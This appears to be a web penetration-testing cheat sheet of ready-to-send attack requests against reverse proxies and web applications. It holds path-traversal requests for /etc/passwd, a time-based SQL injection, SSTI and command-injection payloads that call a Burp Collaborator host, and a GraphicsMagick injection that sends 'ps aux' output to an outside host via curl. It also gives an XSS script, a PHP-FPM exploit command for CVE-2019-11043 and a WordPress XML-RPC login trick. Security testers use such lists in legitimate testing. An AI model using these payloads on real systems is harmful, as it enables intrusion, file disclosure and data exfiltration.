# Security Testing Methodology

## Table of Contents
1. **File Injection Techniques**
2. **Path Traversal and Bypassing Blacklists**
3. **Reverse Proxy Bypass Techniques**
4. **SQL Injection and Time-Based SQLi**
5. **Server-Side Template Injection (SSTI)**
6. **Remote Code Execution (RCE)**
7. **Cross-Site Scripting (XSS)**
8. **PHP-FPM Vulnerability Testing**
9. **Wordpress XML-RPC Testing**

---

## 1. File Injection Techniques

### Injecting `/etc/passwd` Content
- **Technique:**
  - Use URL encoding to inject a file path.
  - **Example Request:**
    ```http
    GET /Endpoint-To-Proxy/file:%2f%2f/Internal-Endpoint/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

---

## 2. Path Traversal and Bypassing Blacklists

### Using Apache as Reverse Proxy
- **Technique:**
  - Use `..//` to change the route of endpoints.
  - **Example Request:**
    ```http
    GET /Endpoint-To-Proxy/..//../../../../../../../etc/passwd HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

### Using Nginx as Reverse Proxy with Apache Backend
- **Technique:**
  - Use `//../` to change the route of endpoints.
  - **Example Request:**
    ```http
    GET /Endpoint-To-Proxy/../../../../../../../etc/passwd//../ HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

### Using Haproxy or Nuster as Reverse Proxy
- **Technique:**
  - Use URL encoding to bypass blacklisted endpoints.
  - **Example Request:**
    ```http
    GET /Endpoint-To-Proxy/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

---

## 3. Reverse Proxy Bypass Techniques

### Using Varnish as Reverse Proxy
- **Technique:**
  - Change the method to `GeT` to bypass blacklisted endpoints.
  - **Example Request:**
    ```http
    GeT /Endpoint-To-Proxy/../../../../../../etc/passwd HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

### Using Absolute-URI
- **Technique:**
  - Use an absolute URI to bypass blacklisted endpoints.
  - **Example Request:**
    ```http
    GET http://company.com/Endpoints-To-Proxy/.git HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

---

## 4. SQL Injection and Time-Based SQLi

### Time-Based SQLi Payloads
- **Technique:**
  - Use time-based SQLi payloads to determine if the injection is successful.
  - **Example Request:**
    ```http
    GET /Endpoint-To-Proxy/'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

---

## 5. Server-Side Template Injection (SSTI)

### SSTI Payloads
- **Technique:**
  - Inject SSTI payloads to achieve Remote Code Execution (RCE).
  - **Example Request:**
    ```http
    GET /Endpoint-To-Proxy/(${T(java.lang.Runtime).getRuntime().exec('nslookup id.burpcollaborator.net')}) HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Referer: https://previous.com/path
    Origin: https://www.company.com
    ```

---

## 6. Remote Code Execution (RCE)

### Command Line Input
- **Technique:**
  - Inject command line payloads into parameters that are used as command line input.
  - **Example Request:**
    ```http
    POST /Endpoint-To-Proxy HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Origin: https://www.company.com
    Content-Type: application/json
    Content-Length: Number
    {
        "parameter": "${nslookup id.burpcollaborator.net}"
    }
    ```

### GraphicsMagick's Input
- **Technique:**
  - Inject payloads into parameters that are used as GraphicsMagick's input.
  - **Example Request:**
    ```http
    POST /Endpoint-To-Proxy HTTP/1.1
    Host: www.company.com
    User-Agent: Mozilla/5.0
    Origin: https://www.company.com
    Content-Type: application/json
    Content-Length: Number
    {
        "parameter": "0 -write |ps${IFS}aux|curl${IFS}http://me.com${IFS}-d${IFS}@-"
    }
    ```

---

## 7. Cross-Site Scripting (XSS)

### Blind XSS
- **Technique:**
  - Inject JavaScript code into parameters that are used as JS code.
  - **Example Request:**
    ```http
    POST /Endpoint-To-Proxy HTTP/1.1
    Host: www.company.com
    Content-Type: application/json
    Content-Length: Number
    {
        "parameter": "<script>alert('XSS')</script>"
    }
    ```

---

## 8. PHP-FPM Vulnerability Testing

### CVE-2019-11043
- **Technique:**
  - Use tools like `phuip-fpizdam` to test for vulnerabilities.
  - **Steps:**
    1. Open your terminal.
    2. Run the following command:
      ```sh
      root@mine:~# ./phuip-fpizdam --cookie Value http://URL/endpont-to.proxy.php
      ```

---

## 9. Wordpress XML-RPC Testing

### Testing XML-RPC Endpoint
- **Technique:**
  - Use `curl` to send a request to the XML-RPC endpoint.
  - **Steps:**
    1. Open your terminal.
    2. Run the following command:
      ```sh
      curl 'https://www.company.com/xmlrpc.php' --data-binary "`cat file.xml`" -H 'Content-type: application/xml'
      ```
    3. The content of `file.xml`:
      ```xml
      <methodCall>
          <methodName>wp.getOptions</methodName>
          <params>
              <param>
                  <value>
                      <string>zzz</string>
                  </value>
              </param>
              <param>
                  <value>
                      <struct>
                          <member>
                              <name>PI:EMAIL</name>
                              <value><string>@@@nopass@@@</string></value>
                          </member>
                      </struct>
                  </value>
              </param>
          </params>
      </methodCall>
      ```

---

Thank you for your attention.

Mahmoud M. Awali  
[@0xAwali]